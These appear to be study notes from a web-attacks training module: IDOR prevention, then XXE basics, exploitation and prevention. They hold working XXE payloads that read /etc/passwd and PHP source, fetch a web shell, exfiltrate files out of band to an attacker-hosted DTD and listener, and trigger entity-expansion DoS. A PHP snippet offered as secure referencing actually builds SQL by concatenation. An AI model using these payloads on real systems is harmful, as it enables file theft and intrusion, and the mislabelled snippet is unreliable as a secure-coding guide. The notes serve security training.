This code retrieves the user's role and identity from the **server-side session token** — not from a cookie or JSON body sent by the client. A user can only read or write their own profile (`user.uid == userId`), unless they have the `admin` role verified on the back-end. This is the right approach because user privileges are never passed through the HTTP request where the client could manipulate them.

In our attacks, we exploited role values stored in cookies (`Cookie: role=employee`) and JSON request bodies (`"role": "employee"`) — both under the client's control. The above RBAC example eliminates that risk entirely by keeping privileges server-side.

#### Object Referencing

Even with a solid access control system, using predictable object references like `uid=1` makes it trivial for attackers to guess and enumerate other IDs. We should always use **strong, unique, unpredictable references** like **UUIDs (Version 4)**:

```
89c9b29b-d19f-4515-b2dd-abb6e693eb20
```

UUIDs are generated server-side when an object is created, stored in the back-end database, and mapped to the actual internal record. Whenever a UUID is received in a request, the database uses the map to return the correct object. This is how it can look in PHP:

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

Key rules to follow for secure object referencing:
- **Never calculate hashes on the front-end** — always generate them server-side when the object is created.
- **Store UUIDs in the database** and create maps for quick cross-referencing.
- **UUIDs alone are not enough** — they make IDOR harder to find but won't stop it if access control is broken. As we saw in this module, even unique references can be exploited by replaying one user's request with another user's session.

Implementing both strong access control (RBAC) and strong object referencing (UUIDs) together provides solid protection against IDOR vulnerabilities.

---

## Section 3: XML External Entity (XXE) Injection

---

### Intro to XXE

XXE (XML External Entity) Injection is a vulnerability that occurs when an application parses XML input from a user without properly sanitizing or restricting it. This allows attackers to inject malicious XML that references external entities — like local files on the server — and have their content returned in the response.

XXE is considered one of OWASP's Top 10 Web Security Risks because of how much damage it can cause — from reading sensitive config files and source code, to stealing credentials, executing remote code, or even crashing the server with a Denial of Service attack.

#### XML Basics

XML (Extensible Markup Language) is a markup language used to store and transfer structured data. Unlike HTML (which displays data), XML is focused on organizing and representing data structures. XML documents are formed of element trees, where each element is denoted by a tag. The first element is called the **root element**, and all others are **child elements**.

Here is a basic example of an XML email document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>Hello, please share the invoice for January 1, 2022.</body>
</email>
```

Key XML components:

| Component   | Definition | Example |
|-------------|------------|---------|
| Tag         | Keys of an XML document, wrapped with `</>` | `<date>` |
| Entity      | XML variables, wrapped with `&;` | `&lt;` |
| Element     | A tag and its value between start and end tags | `<date>01-01-2022</date>` |
| Attribute   | Optional specifications stored inside a tag | `version="1.0"` |
| Declaration | First line of an XML file, sets version/encoding | `<?xml version="1.0"?>` |

Some characters are reserved as part of XML document structure: `<`, `>`, `&`, and `"`. If you need to use these inside an XML document as data (not structure), you must replace them with their **entity references**:

| Character | Entity Reference |
|-----------|-----------------|
| `<`       | `&lt;`          |
| `>`       | `&gt;`          |
| `&`       | `&amp;`         |
| `"`       | `&quot;`        |

XML also supports comments using `<!-- comment -->`, the same as HTML.

#### XML DTD (Document Type Definition)

A DTD defines and validates the expected structure of an XML document — which elements exist, which are children of which, and what type of data they contain. The DTD can be defined **inside the XML document itself** or stored in an **external file**.

Here is an example DTD for the email XML document above:

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

The DTD declares the root `email` element and lists its child elements. Each child is then declared individually. `#PCDATA` means the element contains raw text data (Parsed Character Data). Elements with `?` are optional and elements with `*` can repeat.

The DTD can be embedded directly in the XML right after the declaration, or stored externally and referenced with the `SYSTEM` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

It can also be referenced via a URL:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

This works similarly to how HTML documents link to external JavaScript or CSS files.

#### XML Entities

XML entities act like **variables** inside a DTD. They allow you to define a value once and reuse it throughout the document, reducing repetitive data. Entities are defined using the `ENTITY` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once defined, you reference the entity anywhere in the document using `&company;`. The XML parser will replace `&company;` with `Inlane Freight` every time it encounters it.

More importantly, XML entities can also be **external** — meaning they reference a file or URL using the `SYSTEM` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

> **Note:** The `PUBLIC` keyword can be used instead of `SYSTEM` for publicly declared standards or resources (e.g. language codes like `lang="en"`). In most cases, both work the same way.

When you reference `&signature;` in the XML document, the parser replaces it with the contents of `signature.txt` from the server. **This is the core of XXE attacks.** When XML is parsed on the server-side — in SOAP APIs, contact forms, or file upload functions — an external entity can reference a sensitive file on the back-end server, and its contents get returned to the attacker when the entity is referenced in the response.

---

### Local File Disclosure

When a web application trusts unfiltered XML input, an attacker can define external XML entities that reference local files on the server. If the application reflects any of those entity values back in the response, the file contents get displayed to the attacker. This is the core of an XXE Local File Disclosure attack.

#### Identifying

The first step is finding a web page that accepts XML input. A common example is a **Contact Form**. Fill in the form, click Send, and intercept the request in Burp Suite. If the request body is in XML format (e.g. with `<name>`, `<email>`, `<message>` tags), it is a potential XXE target.

Next, check if any field value is **reflected back in the response**. For example, if the response shows `Check your email email@example.com for further instructions`, then the `<email>` field value is being echoed back. This tells us which field to inject into.

> **Note:** Some apps default to JSON but still accept XML. Try changing the `Content-Type` header to `application/xml` and convert the JSON body to XML with an online tool. If the app accepts it, test for XXE.

#### Step-by-Step: Exploiting XXE to Read Local Files

**Step 1 — Test if entities are processed**

Add a custom internal entity to the XML and reference it in the reflected field:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Use `&company;` in the `<email>` field. If the response shows `Inlane Freight` instead of `&company;` as a raw string, the parser is processing entities — the app is vulnerable to XXE.

> **Note:** If the XML request has no existing DTD, add the `DOCTYPE` block before defining your entity. If a `DOCTYPE` is already present, just add the `ENTITY` line inside it.

**Step 2 — Reference a local file**

Replace the internal entity with an external one using the `SYSTEM` keyword and the `file://` path:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Use `&company;` in the `<email>` field and send the request. If the response contains the contents of `/etc/passwd`, the XXE exploit worked. From here, you can read any file the web server process has access to — SSH keys, config files with database passwords, `.env` files, and more.

> **Tip:** In Java web applications, you can sometimes specify a **directory path** instead of a file, and the response will contain a directory listing — useful for finding sensitive files.

**Step 3 — Read PHP source code using the base64 filter**

Directly referencing a PHP file usually fails because PHP code contains XML-breaking characters like `<`, `>`, and `&`. Use PHP's `php://filter` wrapper to base64-encode the file first so it doesn't break the XML format:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

The response will contain a base64-encoded string. Select it in Burp Suite and check the **Inspector tab** on the right pane — it will automatically decode and show the PHP source code.

> **Note:** This trick only works on PHP-based web applications.

#### Remote Code Execution via XXE

Beyond file reading, XXE can sometimes be used for **Remote Code Execution (RCE)**. There are a few approaches:

- **SSH keys** — read `/home/user/.ssh/id_rsa` and use it to SSH into the server.
- **Hash stealing** — on Windows, use XXE to trigger an SMB request to your server and capture the hash.
- **PHP expect filter** — if the server has the PHP `expect` module installed, you can run commands directly using `expect://id`. However, this module is **not installed by default** on modern PHP servers.

The most reliable RCE method is uploading a web shell:

**Step 1 — Create the web shell and start an HTTP server:**
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

**Step 2 — Use XXE with the `expect` filter to download your shell:**
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> **Note:** Spaces in the command are replaced with `$IFS` to avoid breaking the XML syntax. Characters like `|`, `>`, and `{` can also break the command, so avoid them.

Once the server fetches your `shell.php`, you can interact with it for code execution. Because `expect` is rarely available, XXE is most reliably used for **file disclosure** rather than RCE.

#### Other XXE Attacks

**SSRF via XXE**

XXE can be used to perform **Server-Side Request Forgery (SSRF)** attacks — making the server send HTTP requests to internal services, enumerate open ports, or access restricted internal web pages. This is done by pointing the external entity to an internal URL:

```xml
<!ENTITY company SYSTEM "http://localhost:8080/admin">
```

**Denial of Service (DoS) via Entity Loops**

XXE can be used to crash the server by defining a chain of self-referencing entities that expand exponentially, consuming all server memory:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

`a0` is defined as `DOS`, then `a1` references it 10 times, `a2` references `a1` 10 times, and so on. By the time `&a10;` is expanded, the server has to process billions of entity references — causing memory exhaustion. Modern web servers like Apache protect against this, so this attack may not work on updated systems.

---

### Advanced File Disclosure

Not all XXE vulnerabilities are straightforward to exploit. Some file formats cannot be read through basic XXE because their content breaks the XML format. In other cases, the web application may not output any input values at all, so we need to force the data out through errors or out-of-band channels.

#### Advanced Exfiltration with CDATA

In the Local File Disclosure section, we used PHP's `php://filter` to base64-encode PHP source files so they wouldn't break the XML format. But this only works for PHP. For any other web framework, we need a different approach.

We can wrap the file content in a **CDATA tag** (`<![CDATA[ FILE_CONTENT ]]>`). The XML parser treats everything inside CDATA as raw data — it ignores special characters like `<`, `>`, and `&` inside it. This allows us to include any file content without breaking the XML format.

The naive approach would be to define three internal entities and join them:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

However, **this does not work** — XML prevents joining internal and external entities together. We need a different approach.

The solution is to use **XML Parameter Entities** — a special entity type that starts with `%` and can only be used inside a DTD. The key property is: if parameter entities are referenced from an **external DTD file** hosted on our server, they are all treated as external and can be joined freely.

**Step 1 — Create the xxe.dtd file on your machine and host it:**

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Output:
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Step 2 — Send this XML payload to the target:**

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">         <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>">                 <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email>               <!-- reference the &joined; entity to print the file content -->
```

When processed, the server fetches your `xxe.dtd` file, uses it to join the CDATA wrapper around the file content, and returns the full PHP source code in the response — without any base64 encoding and without breaking the XML format.

> **Note:** On some modern web servers, you may not be able to read files like `index.php` because the server protects against entity self-reference loops (which can cause a DoS). If that happens, try other files.

This technique works with **any web framework**, not just PHP, making it very useful when basic XXE methods fail.

#### Error-Based XXE

Sometimes a web application does not display any XML entity output at all — we have no reflected field to inject into. However, if the application **displays PHP runtime errors** and lacks proper exception handling, we can exploit those errors to leak file content.

**How it works:** First, confirm the app shows errors by sending malformed XML — delete a closing tag, use `<roo>` instead of `<root>`, or reference a non-existing entity. If the app throws a PHP error and reveals the server directory path in the message, we can use that to our advantage.

**Step 1 — Create the error-triggering DTD file and host it:**

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

This defines two parameter entities:
- `%file` reads the target file
- `%error` tries to load a path that joins a non-existing entity with the file content — which triggers an error containing the file content in the error message

**Step 2 — Send the payload referencing your DTD:**

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

The server loads your DTD, tries to process `%nonExistingEntity;/%file;` — a path that doesn't exist — and throws an error message that includes the `%file;` content as part of the invalid URI. The file content appears in the error output.

> **Note:** This method can also be used to read source code files, but it is less reliable than the CDATA method — it may have length limitations, and special characters in the file can still break the error output.

---

### Blind Data Exfiltration

In the previous section, the app displayed PHP errors which we used to leak file content. But what if the app shows **no output at all** — no reflected entities, no error messages? This is a completely blind XXE situation, and it requires a different strategy called **Out-of-Band (OOB) Data Exfiltration**.

Instead of making the app print file content to the page, we make the app **send the file content to our own server** via an HTTP request. This is the same concept used in blind SQL injection, blind command injection, and blind XSS — the app never shows us anything, but it makes outbound requests that we can capture.

#### Out-of-Band Data Exfiltration

The attack works like this:
1. We host a DTD file on our machine
2. The vulnerable app fetches our DTD
3. The DTD instructs the app to read a local file, base64-encode it, and send it to our server as a URL parameter
4. We capture and decode the data on our end

**Step 1 — Create the OOB exfiltration DTD (`xxe.dtd`) on your machine:**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

- `%file` reads `/etc/passwd` and base64-encodes it using PHP's filter
- `%oob` creates an entity that makes an HTTP request to our server, placing the base64 data as a URL query parameter `?content=`

**Step 2 — Create a PHP listener (`index.php`) that decodes and logs incoming data:**

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

This script reads the `content` parameter from incoming GET requests, base64-decodes it, and logs the result to the terminal.

**Step 3 — Start your PHP server:**

```bash
vi index.php   # write the above PHP code
php -S 0.0.0.0:8000
```

Output:
```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

**Step 4 — Send the XXE payload to the target:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

- `%remote` fetches your hosted DTD
- `%oob` is evaluated, creating the `content` entity that triggers the HTTP request back to your server with the file data
- `&content;` references the entity to trigger execution

**Step 5 — Receive and read the exfiltrated data on your terminal:**

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

The app never showed us anything — but it sent the file to us. The decoded content of `/etc/passwd` appears in our PHP server logs.

> **Tip:** Instead of sending base64 data as a URL query parameter, you can use **DNS OOB Exfiltration** — place the encoded data as a subdomain (e.g. `ENCODEDTEXT.our.website.com`) and capture it with `tcpdump`. This is more advanced and useful when HTTP outbound is blocked.

#### Automated OOB Exfiltration with XXEinjector

For faster and more automated exploitation, use **XXEinjector** — a Ruby tool that supports basic XXE, CDATA exfiltration, error-based XXE, and blind OOB XXE.

**Step 1 — Clone the tool:**

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

**Step 2 — Save the HTTP request from Burp to a file**

Copy the raw HTTP request and save it (e.g. `/tmp/xxe.req`). Include only the **first line of the XML body** and add `XXEINJECT` after it as a position marker for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Step 3 — Run the tool:**

```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

| Flag | Purpose |
|------|---------|
| `--host` | Your IP address (tun0 interface) |
| `--httpport` | Port your listener runs on |
| `--file` | Path to the saved HTTP request file |
| `--path` | The remote file you want to exfiltrate |
| `--oob=http` | Use HTTP for out-of-band exfiltration |
| `--phpfilter` | Use PHP base64 filter to encode the file |

The tool won't print the data directly (because it's base64 encoded). All exfiltrated files are saved in the `Logs/` folder:

```bash
cat Logs/10.129.201.94/etc/passwd.log

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP...
```

---

### XXE Prevention

XXE vulnerabilities are primarily caused by **outdated XML libraries** rather than coding mistakes, making them easier to prevent through dependency management and safe XML configuration.

#### Avoiding Outdated Components

The most important step is keeping XML libraries up to date. For example, PHP's `libxml_disable_entity_loader()` function is **deprecated since PHP 8.0** because it allows unsafe external entity loading. Using it in modern PHP code will trigger warnings in code editors like VSCode.

Beyond XML libraries, update any component that parses XML — including:
- API libraries like **SOAP**
- Document processors that handle **SVG images** or **PDF files**
- Any outdated **Node.js modules**

Using the latest versions of all web components greatly reduces the risk of XXE and many other web vulnerabilities.

#### Using Safe XML Configurations

Even after updating libraries, apply these XML configuration rules as a second layer of defense:

- **Disable custom DTD references** — prevents loading external document type definitions.
- **Disable external XML entities** — prevents the `SYSTEM` keyword from fetching files.
- **Disable parameter entity processing** — blocks the `%entity;` technique used in advanced attacks.
- **Disable XInclude support** — prevents another XML inclusion method from being abused.
- **Prevent entity reference loops** — stops Denial of Service attacks using recursive entities.
- **Disable runtime error display** — prevents error-based XXE exfiltration.

#### Additional Recommendations

- **Use JSON or YAML instead of XML** where possible — avoid XML-based API standards like SOAP and prefer REST (JSON-based) APIs instead.
- **Use a Web Application Firewall (WAF)** as an additional layer — but never rely on it alone, as WAFs can be bypassed.
- Safe XML configurations are a workaround, not a fix — always update your libraries first.

---

*End of Notes — Web Attacks Module (Sections 1–17)*
